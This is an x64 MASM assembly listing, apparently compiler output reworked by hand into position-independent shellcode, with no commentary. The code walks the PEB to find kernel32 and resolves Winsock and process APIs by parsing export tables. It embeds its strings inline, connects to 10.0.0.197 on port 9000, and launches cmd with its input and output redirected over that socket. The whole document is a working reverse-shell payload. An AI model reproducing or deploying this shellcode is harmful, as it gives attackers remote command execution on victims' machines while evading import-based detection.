; Listing generated by Microsoft (R) Optimizing Compiler Version 19.29.30133.0 

;include listing.inc

;INCLUDELIB LIBCMT
;INCLUDELIB OLDNAMES

PUBLIC	RtlSecureZeroMemory
PUBLIC	get_module_by_name
PUBLIC	get_func_by_name
PUBLIC	main
_DATA	SEGMENT
$SG95987 DB	'k', 00H, 'e', 00H, 'r', 00H, 'n', 00H, 'e', 00H, 'l', 00H
	DB	'3', 00H, '2', 00H, '.', 00H, 'd', 00H, 'l', 00H, 'l', 00H, 00H
	DB	00H
	ORG $+6
$SG95989 DB	'LoadLibraryA', 00H
	ORG $+3
$SG95991 DB	'GetProcAddress', 00H
	ORG $+1
$SG95993 DB	'ExitThread', 00H
	ORG $+1
$SG96009 DB	'cmd', 00H
$SG95994 DB	'Ws2_32.dll', 00H
	ORG $+5
$SG95995 DB	'user32.dll', 00H
	ORG $+5
$SG95996 DB	'Shell32.dll', 00H
	ORG $+4
$SG95997 DB	'MessageBoxA', 00H
	ORG $+4
$SG95998 DB	'WSAStartup', 00H
	ORG $+5
$SG95999 DB	'WSASocketA', 00H
	ORG $+1
$SG96000 DB	'htons', 00H
	ORG $+6
$SG96001 DB	'inet_addr', 00H
	ORG $+6
$SG96002 DB	'WSAConnect', 00H
	ORG $+5
$SG96003 DB	'CreateProcessA', 00H
	ORG $+1
$SG96007 DB	'10.0.0.197', 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT SEGMENT
AlignRSP PROC
    push rsi
    mov rsi,rsp
    and rsp, 0FFFFFFFFFFFFFFF0h
    sub rsp, 020h
    call main
    mov rsp, rsi
    pop rsi
    ret
AlignRSP ENDP
_TEXT ENDS
_TEXT	SEGMENT
_GetProcAddress$ = 80
w2_32_dll$ = 88
base$ = 96
_LoadLibraryA$ = 104
Winsock$ = 112
load_lib$ = 120
get_proc$ = 128
exit_thread$ = 136
u32_dll$ = 144
_MessageBoxA$ = 152
_WsaStartup$ = 160
_WSASocketA$ = 168
_htons$ = 176
_inet_addr$ = 184
_WSAConnect$ = 192
_CreateProcessA$ = 200
hax$ = 208
_ExitThread$ = 224
shell32_dll$ = 232
ini_processo$ = 240
processo_info$ = 352
wsaData$ = 384
main	PROC
; File C:\Users\latortuga\Desktop\Dev\ShellCodeFromC\src\shell.c
; Line 6
$LN10:
	sub	rsp, 808				; 00000328H
; Line 8
call SG95987___
 DB	'k', 00H, 'e', 00H, 'r', 00H, 'n', 00H, 'e', 00H, 'l', 00H
	DB	'3', 00H, '2', 00H, '.', 00H, 'd', 00H, 'l', 00H, 'l', 00H, 00H
	DB	00H
	ORG $+6
SG95987___:
	pop rcx
;	lea	rcx, OFFSET $SG95987
	call	get_module_by_name
	mov	QWORD PTR base$[rsp], rax
; Line 9
	cmp	QWORD PTR base$[rsp], 0
	jne	SHORT $LN2@main
; Line 10
	mov	eax, 1
	jmp	$LN1@main
$LN2@main:
; Line 11
call SG95989___
 DB	'LoadLibraryA', 00H
	ORG $+3
SG95989___:
	pop rdx
;	lea	rdx, OFFSET $SG95989
	mov	rcx, QWORD PTR base$[rsp]
	call	get_func_by_name
	mov	QWORD PTR load_lib$[rsp], rax
; Line 12
	cmp	QWORD PTR load_lib$[rsp], 0
	jne	SHORT $LN3@main
; Line 13
	mov	eax, 1
	jmp	$LN1@main
$LN3@main:
; Line 14
call SG95991___
 DB	'GetProcAddress', 00H
	ORG $+1
SG95991___:
	pop rdx
;	lea	rdx, OFFSET $SG95991
	mov	rcx, QWORD PTR base$[rsp]
	call	get_func_by_name
	mov	QWORD PTR get_proc$[rsp], rax
; Line 15
	cmp	QWORD PTR get_proc$[rsp], 0
	jne	SHORT $LN4@main
; Line 16
	mov	eax, 1
	jmp	$LN1@main
$LN4@main:
; Line 17
call SG95993___
 DB	'ExitThread', 00H
	ORG $+1
SG95993___:
	pop rdx
;	lea	rdx, OFFSET $SG95993
	mov	rcx, QWORD PTR base$[rsp]
	call	get_func_by_name
	mov	QWORD PTR exit_thread$[rsp], rax
; Line 19
	mov	rax, QWORD PTR load_lib$[rsp]
	mov	QWORD PTR _LoadLibraryA$[rsp], rax
; Line 20
	mov	rax, QWORD PTR exit_thread$[rsp]
	mov	QWORD PTR _ExitThread$[rsp], rax
; Line 21
	mov	rax, QWORD PTR get_proc$[rsp]
	mov	QWORD PTR _GetProcAddress$[rsp], rax
; Line 23
call SG95994___
 DB	'Ws2_32.dll', 00H
	ORG $+5
SG95994___:
	pop rcx
;	lea	rcx, OFFSET $SG95994
	call	QWORD PTR _LoadLibraryA$[rsp]
	mov	QWORD PTR w2_32_dll$[rsp], rax
; Line 24
call SG95995___
 DB	'user32.dll', 00H
	ORG $+5
SG95995___:
	pop rcx
;	lea	rcx, OFFSET $SG95995
	call	QWORD PTR _LoadLibraryA$[rsp]
	mov	QWORD PTR u32_dll$[rsp], rax
; Line 25
call SG95996___
 DB	'Shell32.dll', 00H
	ORG $+4
SG95996___:
	pop rcx
;	lea	rcx, OFFSET $SG95996
	call	QWORD PTR _LoadLibraryA$[rsp]
	mov	QWORD PTR shell32_dll$[rsp], rax
; Line 28
call SG95997___
 DB	'MessageBoxA', 00H
	ORG $+4
SG95997___:
	pop rdx
;	lea	rdx, OFFSET $SG95997
	mov	rcx, QWORD PTR u32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _MessageBoxA$[rsp], rax
; Line 31
call SG95998___
 DB	'WSAStartup', 00H
	ORG $+5
SG95998___:
	pop rdx
;	lea	rdx, OFFSET $SG95998
	mov	rcx, QWORD PTR w2_32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _WsaStartup$[rsp], rax
; Line 34
call SG95999___
 DB	'WSASocketA', 00H
	ORG $+1
SG95999___:
	pop rdx
;	lea	rdx, OFFSET $SG95999
	mov	rcx, QWORD PTR w2_32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _WSASocketA$[rsp], rax
; Line 37
call SG96000___
 DB	'htons', 00H
	ORG $+6
SG96000___:
	pop rdx
;	lea	rdx, OFFSET $SG96000
	mov	rcx, QWORD PTR w2_32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _htons$[rsp], rax
; Line 40
call SG96001___
 DB	'inet_addr', 00H
	ORG $+6
SG96001___:
	pop rdx
;	lea	rdx, OFFSET $SG96001
	mov	rcx, QWORD PTR w2_32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _inet_addr$[rsp], rax
; Line 43
call SG96002___
 DB	'WSAConnect', 00H
	ORG $+5
SG96002___:
	pop rdx
;	lea	rdx, OFFSET $SG96002
	mov	rcx, QWORD PTR w2_32_dll$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _WSAConnect$[rsp], rax
; Line 46
call SG96003___
 DB	'CreateProcessA', 00H
	ORG $+1
SG96003___:
	pop rdx
;	lea	rdx, OFFSET $SG96003
	mov	rcx, QWORD PTR base$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _CreateProcessA$[rsp], rax
; Line 50
	cmp	QWORD PTR _MessageBoxA$[rsp], 0
	jne	SHORT $LN5@main
	mov	eax, 1
	jmp	$LN1@main
$LN5@main:
; Line 58
	lea	rdx, QWORD PTR wsaData$[rsp]
	mov	cx, 514					; 00000202H
	call	QWORD PTR _WsaStartup$[rsp]
	test	eax, eax
	je	SHORT $LN6@main
; Line 59
	xor	eax, eax
	jmp	$LN1@main
$LN6@main:
; Line 61
	mov	DWORD PTR [rsp+40], 0
	mov	DWORD PTR [rsp+32], 0
	xor	r9d, r9d
	mov	r8d, 6
	mov	edx, 1
	mov	ecx, 2
	call	QWORD PTR _WSASocketA$[rsp]
	mov	eax, eax
	mov	QWORD PTR Winsock$[rsp], rax
; Line 62
	cmp	QWORD PTR Winsock$[rsp], 0
	jne	SHORT $LN7@main
; Line 63
	xor	eax, eax
	jmp	$LN1@main
$LN7@main:
; Line 65
	mov	cx, 9000				; 00002328H
	call	QWORD PTR _htons$[rsp]
	mov	WORD PTR hax$[rsp+2], ax
; Line 66
	mov	eax, 2
	mov	WORD PTR hax$[rsp], ax
; Line 67
call SG96007___
 DB	'10.0.0.197', 00H
SG96007___:
	pop rcx
;	lea	rcx, OFFSET $SG96007
	call	QWORD PTR _inet_addr$[rsp]
	mov	DWORD PTR hax$[rsp+4], eax
; Line 69
	mov	QWORD PTR [rsp+48], 0
	mov	QWORD PTR [rsp+40], 0
	mov	QWORD PTR [rsp+32], 0
	xor	r9d, r9d
	mov	r8d, 16
	lea	rdx, QWORD PTR hax$[rsp]
	mov	rcx, QWORD PTR Winsock$[rsp]
	call	QWORD PTR _WSAConnect$[rsp]
	test	eax, eax
	je	SHORT $LN8@main
; Line 70
	xor	eax, eax
	jmp	$LN1@main
$LN8@main:
; Line 72
	mov	edx, 104				; 00000068H
	lea	rcx, QWORD PTR ini_processo$[rsp]
	call	RtlSecureZeroMemory
; Line 73
	mov	DWORD PTR ini_processo$[rsp], 104	; 00000068H
; Line 74
	mov	DWORD PTR ini_processo$[rsp+60], 257	; 00000101H
; Line 75
	mov	rax, QWORD PTR Winsock$[rsp]
	mov	QWORD PTR ini_processo$[rsp+96], rax
	mov	rax, QWORD PTR ini_processo$[rsp+96]
	mov	QWORD PTR ini_processo$[rsp+88], rax
	mov	rax, QWORD PTR ini_processo$[rsp+88]
	mov	QWORD PTR ini_processo$[rsp+80], rax
; Line 76
	lea	rax, QWORD PTR processo_info$[rsp]
	mov	QWORD PTR [rsp+72], rax
	lea	rax, QWORD PTR ini_processo$[rsp]
	mov	QWORD PTR [rsp+64], rax
	mov	QWORD PTR [rsp+56], 0
	mov	QWORD PTR [rsp+48], 0
	mov	DWORD PTR [rsp+40], 0
	mov	DWORD PTR [rsp+32], 1
	xor	r9d, r9d
	xor	r8d, r8d
call SG96009___
 DB	'cmd', 00H
SG96009___:
	pop rdx
;	lea	rdx, OFFSET $SG96009
	xor	ecx, ecx
	call	QWORD PTR _CreateProcessA$[rsp]
; Line 77
	xor	eax, eax
$LN1@main:
; Line 78
	add	rsp, 808				; 00000328H
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT get_func_by_name
_TEXT	SEGMENT
k$1 = 0
i$2 = 8
exp$ = 16
expAddr$ = 24
funcNamesListRVA$ = 28
namesOrdsListRVA$ = 32
funcsListRVA$ = 36
curr_name$3 = 40
idh$ = 48
exportsDir$ = 56
nt_headers$ = 64
namesCount$ = 72
nameIndex$4 = 80
nameRVA$5 = 88
funcRVA$6 = 96
module$ = 128
func_name$ = 136
get_func_by_name PROC					; COMDAT
; File C:\Users\latortuga\Desktop\Dev\ShellCodeFromC\src\peb_lookup.h
; Line 105
$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
; Line 106
	mov	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR idh$[rsp], rax
; Line 107
	mov	rax, QWORD PTR idh$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN8@get_func_b
; Line 108
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN8@get_func_b:
; Line 110
	mov	rax, QWORD PTR idh$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR nt_headers$[rsp], rax
; Line 111
	mov	eax, 8
	imul	rax, rax, 0
	mov	rcx, QWORD PTR nt_headers$[rsp]
	lea	rax, QWORD PTR [rcx+rax+136]
	mov	QWORD PTR exportsDir$[rsp], rax
; Line 112
	mov	rax, QWORD PTR exportsDir$[rsp]
	mov	eax, DWORD PTR [rax]
	test	rax, rax
	jne	SHORT $LN9@get_func_b
; Line 113
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN9@get_func_b:
; Line 116
	mov	rax, QWORD PTR exportsDir$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR expAddr$[rsp], eax
; Line 117
	mov	eax, DWORD PTR expAddr$[rsp]
	add	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR exp$[rsp], rax
; Line 118
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+24]
	mov	QWORD PTR namesCount$[rsp], rax
; Line 120
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+28]
	mov	DWORD PTR funcsListRVA$[rsp], eax
; Line 121
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+32]
	mov	DWORD PTR funcNamesListRVA$[rsp], eax
; Line 122
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+36]
	mov	DWORD PTR namesOrdsListRVA$[rsp], eax
; Line 125
	mov	QWORD PTR i$2[rsp], 0
	jmp	 $LN4@get_func_b
$LN2@get_func_b:
	mov	rax, QWORD PTR i$2[rsp]
	inc	rax
	mov	QWORD PTR i$2[rsp], rax
$LN4@get_func_b:
	mov	rax, QWORD PTR namesCount$[rsp]
	cmp	QWORD PTR i$2[rsp], rax
	jae	$LN3@get_func_b
; Line 126
	mov	eax, DWORD PTR funcNamesListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR nameRVA$5[rsp], rax
; Line 127
	mov	eax, DWORD PTR namesOrdsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR nameIndex$4[rsp], rax
; Line 128
	mov	eax, DWORD PTR funcsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR nameIndex$4[rsp]
	movzx	ecx, WORD PTR [rcx]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR funcRVA$6[rsp], rax
; Line 130
	mov	rax, QWORD PTR nameRVA$5[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR curr_name$3[rsp], rax
; Line 131
	mov	QWORD PTR k$1[rsp], 0
; Line 132
	mov	QWORD PTR k$1[rsp], 0
	jmp	 $LN7@get_func_b
$LN5@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	inc	rax
	mov	QWORD PTR k$1[rsp], rax
$LN7@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
; Line 133
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	mov	rcx, QWORD PTR k$1[rsp]
	mov	rdx, QWORD PTR curr_name$3[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	movsx	ecx, BYTE PTR [rcx]
	cmp	eax, ecx
	je	SHORT $LN10@get_func_b
	jmp	 $LN6@get_func_b
$LN10@get_func_b:
; Line 134
	jmp	 $LN5@get_func_b
$LN6@get_func_b:
; Line 135
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
; Line 137
	mov	rax, QWORD PTR funcRVA$6[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	 $LN1@get_func_b
$LN11@get_func_b:
; Line 139
	jmp	$LN2@get_func_b
$LN3@get_func_b:
; Line 140
	xor	eax, eax
$LN1@get_func_b:
; Line 141
	add	rsp, 120				; 00000078H
	ret	0
get_func_by_name ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT get_module_by_name
_TEXT	SEGMENT
i$1 = 0
c1$2 = 8
c2$3 = 12
curr_name$4 = 16
curr_module$ = 24
tv130 = 32
tv136 = 36
tv152 = 40
tv158 = 44
peb$ = 48
ldr$ = 56
Flink$ = 64
list$ = 72
module_name$ = 128
get_module_by_name PROC					; COMDAT
; File C:\Users\latortuga\Desktop\Dev\ShellCodeFromC\src\peb_lookup.h
; Line 69
$LN15:
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 104				; 00000068H
; Line 70
	mov	QWORD PTR peb$[rsp], 0
; Line 72
	mov	rax, QWORD PTR gs:[96]
	mov	QWORD PTR peb$[rsp], rax
; Line 76
	mov	rax, QWORD PTR peb$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR ldr$[rsp], rax
; Line 77
	lea	rax, QWORD PTR list$[rsp]
	mov	rcx, QWORD PTR ldr$[rsp]
	mov	rdi, rax
	lea	rsi, QWORD PTR [rcx+16]
	mov	ecx, 16
	rep movsb
; Line 79
	mov	rax, QWORD PTR list$[rsp]
	mov	QWORD PTR Flink$[rsp], rax
; Line 80
	mov	rax, QWORD PTR Flink$[rsp]
	mov	QWORD PTR curr_module$[rsp], rax
$LN2@get_module:
; Line 82
	cmp	QWORD PTR curr_module$[rsp], 0
	je	$LN3@get_module
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+48], 0
	je	$LN3@get_module
; Line 83
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+96], 0
	je	$LN7@get_module
; Line 84
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+96]
	mov	QWORD PTR curr_name$4[rsp], rax
; Line 86
	mov	QWORD PTR i$1[rsp], 0
; Line 87
	mov	QWORD PTR i$1[rsp], 0
	jmp	 $LN6@get_module
$LN4@get_module:
	mov	rax, QWORD PTR i$1[rsp]
	inc	rax
	mov	QWORD PTR i$1[rsp], rax
$LN6@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
; Line 89
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv130[rsp], eax
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv130[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv130[rsp]
	mov	DWORD PTR tv136[rsp], eax
	jmp	 $LN12@get_module
$LN11@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	DWORD PTR tv136[rsp], eax
$LN12@get_module:
	movzx	eax, WORD PTR tv136[rsp]
	mov	WORD PTR c1$2[rsp], ax
; Line 90
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv152[rsp], eax
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv152[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv152[rsp]
	mov	DWORD PTR tv158[rsp], eax
	jmp	 $LN14@get_module
$LN13@get_module:
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	DWORD PTR tv158[rsp], eax
$LN14@get_module:
	movzx	eax, WORD PTR tv158[rsp]
	mov	WORD PTR c2$3[rsp], ax
; Line 91
	movzx	eax, WORD PTR c1$2[rsp]
	movzx	ecx, WORD PTR c2$3[rsp]
	cmp	eax, ecx
	je	SHORT $LN8@get_module
	jmp	 $LN5@get_module
$LN8@get_module:
; Line 92
	jmp	$LN4@get_module
$LN5@get_module:
; Line 93
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
; Line 95
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+48]
	jmp	 $LN1@get_module
$LN9@get_module:
$LN7@get_module:
; Line 99
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR curr_module$[rsp], rax
; Line 100
	jmp	$LN2@get_module
$LN3@get_module:
; Line 101
	xor	eax, eax
$LN1@get_module:
; Line 102
	add	rsp, 104				; 00000068H
	pop	rdi
	pop	rsi
	ret	0
get_module_by_name ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT RtlSecureZeroMemory
_TEXT	SEGMENT
vptr$ = 0
ptr$ = 32
cnt$ = 40
RtlSecureZeroMemory PROC				; COMDAT
;; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\um\winnt.h
; Line 20277
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 16
; Line 20278
	mov	rax, QWORD PTR ptr$[rsp]
	mov	QWORD PTR vptr$[rsp], rax
; Line 20282
	mov	rdi, QWORD PTR vptr$[rsp]
	xor	eax, eax
	mov	rcx, QWORD PTR cnt$[rsp]
	rep stosb
; Line 20304
	mov	rax, QWORD PTR ptr$[rsp]
; Line 20305
	add	rsp, 16
	pop	rdi
	ret	0
RtlSecureZeroMemory ENDP
_TEXT	ENDS
END
